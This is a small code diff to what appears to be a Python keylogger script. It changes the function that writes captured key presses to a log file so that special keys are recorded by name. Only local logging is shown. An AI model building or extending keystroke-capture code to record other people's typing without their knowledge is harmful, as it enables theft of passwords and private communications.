@@ -18,7 +18,10 @@ def create_new_log_file():
 
 # Define a function to write the key presses to a log file.
 def write_to_log(log_file, key):
-    log_file.write(str(key) + "\n")
+    if hasattr(key, "name"):
+        log_file.write(f"[{key.name}]" + "\n")
+    else:
+        log_file.write(str(key) + "\n")
     log_file.flush()
     
 # Define a function that listens for key presses and writes them to the log file.
